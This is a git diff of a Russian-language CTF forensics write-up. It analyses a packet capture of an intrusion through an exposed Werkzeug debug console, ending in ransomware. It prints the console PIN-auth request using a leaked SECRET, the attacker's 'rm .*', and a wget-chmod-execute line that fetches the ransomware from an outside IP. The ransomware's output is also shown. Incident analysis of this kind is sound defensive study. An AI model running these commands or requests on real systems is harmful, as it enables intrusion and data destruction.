@@ -22,6 +22,8 @@ http://10.10.10.3:5000/console?&__debugger__=yes&cmd=import%20socket%2Csubproces
 root@7a5a67189bc9:/app#
 ```
 
+---
+
 # Условие 2
 
 15. Враг врага 2 - 2
@@ -34,6 +36,8 @@ root@7a5a67189bc9:/app#
 
 С сервера `81.177.221.242` было скачано приложение-шифровальщик `app`
 
+---
+
 # Условие 3
 
 16. Враг врага 2 - 3
@@ -42,13 +46,16 @@ root@7a5a67189bc9:/app#
 
 # Ответ 3
 
-! Предполагаю
-
 ```
-CUSTOM_write found, patched.\r\nok\r\n
+CUSTOM_write found, patched.
+ok
 ```
 
-Runtime-patching чтобы использовать CUSTOM_write() вместо write() чтобы спрятаться от AppArmor'а на сервере
+Runtime-patching чтобы использовать CUSTOM_write() вместо write() чтобы спрятаться от AppArmor'а (или еще чего-то) на сервере
+
+По аналогии с [linux-anti-debugging](https://github.com/tobyxdd/linux-anti-debugging/tree/master)
+
+---
 
 # Условие 4
 
@@ -58,21 +65,19 @@ Runtime-patching чтобы использовать CUSTOM_write() вместо
 
 # Ответ 4
 
-Примерно с пакета 945 (Jan 22 22:3?:??) (с удаления всего в домашней директории):
+Примерно с пакета 945 (Jan 22 22:34:49) (с удаления всех файлов в домашней директории):
 ```
 rm .*
 ```
+Вредоносное приложение было запущено с пакета 1426 (Jan 22 22:35:52):
 ```
 cd ..
 wget http://81.177.221.242:8125/app
 chmod +x ./app
 ./app
 ```
-И потом (1535):
-```
-Encrypting .//app: Encrypting .//ioal/app/docker-compose.yml: Encrypting .//ioal/app/server/requirements.txt: Encrypting .//ioal/app/server/wait-for-postgres.sh: Encrypting .//ioal/app/server/Dockerfile: Encrypting .//ioal/app/server/templates/index.html: Encrypting .//ioal/app/server/__init__.py: Encrypting .//ioal/app/server/assets/css/listr.pack.css: Encrypting .//ioal/app/server/assets/css/custom.css: Encrypting .//ioal/app/server/assets/css/jquery.filer.css: Encrypting .//ioal/app/server/assets/fonts/fontawesome-webfont.woff: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.ttf: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer-preview.html: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.svg: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.eot: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.woff: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.cs
-"\
-```
+
+---
 
 # Условие 5
 
@@ -82,14 +87,71 @@ Encrypting .//app: Encrypting .//ioal/app/docker-compose.yml: Encrypting .//ioal
 
 # Ответ 5
 
+### Пакет 577 (22:33:21):
 ```
-strings dump.pcapng | grep SEC
-  SECRET = "yqqPfQiFZmXsmnZQYMPF";
-  SECRET = "yqqPfQiFZmXsmnZQYMPF";
-  SECRET = "yqqPfQiFZmXsmnZQYMPF";
+<!doctype html>
+<html lang=en>
+  <head>
+    <title>Console // Werkzeug Debugger</title>
+    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
+    <link rel="shortcut icon"
+        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
+    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
+    <script>
+      var CONSOLE_MODE = true,
+          EVALEX = true,
+          EVALEX_TRUSTED = false,
+          SECRET = "yqqPfQiFZmXsmnZQYMPF";
+    </script>
+  </head>
+  <body style="background-color: #fff">
+    <div class="debugger">
+<h1>Interactive Console</h1>
+<div class="explanation">
+In this console you can execute Python expressions in the context of the
+application.  The initial namespace was created by the debugger automatically.
+</div>
+<div class="console"><div class="inner">The Console requires JavaScript.</div></div>
+      <div class="footer">
+        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
+        friendly Werkzeug powered traceback interpreter.
+      </div>
+    </div>
+
+    <div class="pin-prompt">
+      <div class="inner">
+        <h3>Console Locked</h3>
+        <p>
+          The console is locked and needs to be unlocked by entering the PIN.
+          You can find the PIN printed out on the standard output of your
+          shell that runs the server.
+        <form>
+          <p>PIN:
+            <input type=text name=pin size=14>
+            <input type=submit name=btn value="Confirm Pin">
+        </form>
+      </div>
+    </div>
+  </body>
+</html>
 ```
 
-А так же эта же строка в параметре s= в 172.18.0.3:5000/console
+Далее эта же строка в параметре s= в 172.18.0.3:5000/console используется для входа в python консоль вместе с муляжом пин-кода (Пакет 693 (22:33:24) ):
+
+```
+GET /console?__debugger__=yes&cmd=pinauth&pin=123-456-789&s=yqqPfQiFZmXsmnZQYMPF HTTP/1.1
+Host: 10.10.10.3:5000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.3:5000/console
+Connection: keep-alive
+Cookie: hide-dotfile=no
+Priority: u=0
+```
+
+---
 
 # Условие 6
 
@@ -99,8 +161,95 @@ strings dump.pcapng | grep SEC
 
 # Ответ 6
 
-Вручную удалены все файлы из домашнего каталога
+Вручную удалены все файлы из домашнего каталога через `rm .*`
 
-Все что осталось было зашифровано (то есть веб приложение) с помощью `app`
+Все что осталось было зашифровано (то есть веб приложение) с помощью скачанного через `wget` приложения `app`
 
-Тип: ??
+### Принцип работы `app`:
+
+По аналогии с [linux-anti-debugging](https://github.com/tobyxdd/linux-anti-debugging/tree/master) приложение подменяет системные вызовы, вероятно чтобы не быть обнаруженным AppArmor'ом или еще чем-то (пакет 1433 (22:35:52) ):
+```
+CUSTOM_write found, patched.
+ok
+```
+
+Далее приложение шифрует все файлы в своей и дочерних директориях, меняя их название с {name} на {name}.enc (пакет 1535 (Jan 22 22:35:52) ):
+```
+Encrypting .//app: Encrypting .//ioal/app/docker-compose.yml: Encrypting .//ioal/app/server/requirements.txt: Encrypting .//ioal/app/server/wait-for-postgres.sh: Encrypting .//ioal/app/server/Dockerfile: Encrypting .//ioal/app/server/templates/index.html: Encrypting .//ioal/app/server/__init__.py: Encrypting .//ioal/app/server/assets/css/listr.pack.css: Encrypting .//ioal/app/server/assets/css/custom.css: Encrypting .//ioal/app/server/assets/css/jquery.filer.css: Encrypting .//ioal/app/server/assets/fonts/fontawesome-webfont.woff: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.ttf: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer-preview.html: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.svg: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.eot: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.woff: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.cs
+"\
+```
+
+```
+.
+├── app.enc
+└── ioal
+    ├── app
+    │   ├── docker-compose.yml.enc
+    │   ├── init.sql
+    │   ├── init.sql.enc
+    │   └── server
+    │       ├── assets
+    │       │   ├── css
+    │       │   │   ├── custom.css.enc
+    │       │   │   ├── jquery.filer.css.enc
+    │       │   │   └── listr.pack.css.enc
+    │       │   ├── fonts
+    │       │   │   ├── fontawesome-webfont.svg.enc
+    │       │   │   ├── fontawesome-webfont.ttf.enc
+    │       │   │   ├── fontawesome-webfont.woff.enc
+    │       │   │   └── jquery.filer-icons
+    │       │   │       ├── jquery-filer.css.enc
+    │       │   │       ├── jquery-filer.eot.enc
+    │       │   │       ├── jquery-filer-preview.html.enc
+    │       │   │       ├── jquery-filer.svg.enc
+    │       │   │       ├── jquery-filer.ttf.enc
+    │       │   │       └── jquery-filer.woff.enc
+    │       │   └── js
+    │       │       ├── bootstrap.min.js.enc
+    │       │       ├── custom.js.enc
+    │       │       ├── jquery.base64.min.js.enc
+    │       │       ├── jquery.filer.min.js.enc
+    │       │       ├── jquery.min.js.enc
+    │       │       ├── listr.pack.js.enc
+    │       │       └── tether.min.js.enc
+    │       ├── Dockerfile.enc
+    │       ├── __init__.py.enc
+    │       ├── requirements.txt.enc
+    │       ├── static
+    │       │   └── img
+    │       ├── templates
+    │       │   └── index.html.enc
+    │       └── wait-for-postgres.sh.enc
+    ├── Desktop
+    ├── Documents
+    ├── Downloads
+    ├── Music
+    ├── Pictures
+    ├── Public
+    ├── snap
+    │   ├── firefox
+    │   │   ├── 4793
+    │   │   ├── common
+    │   │   └── current -> 4793
+    │   ├── firmware-updater
+    │   │   ├── 127
+    │   │   ├── 147
+    │   │   ├── common
+    │   │   └── current -> 147
+    │   └── snapd-desktop-integration
+    │       ├── 178
+    │       │   ├── Desktop
+    │       │   ├── Documents
+    │       │   ├── Downloads
+    │       │   ├── Music
+    │       │   ├── Pictures
+    │       │   ├── Public
+    │       │   ├── Templates
+    │       │   └── Videos
+    │       ├── common
+    │       └── current -> 178
+    ├── Templates
+    └── Videos
+```
+
+Тип вредоноса: Шифровальщик или шифровальщик-вымогатель (ransomware)
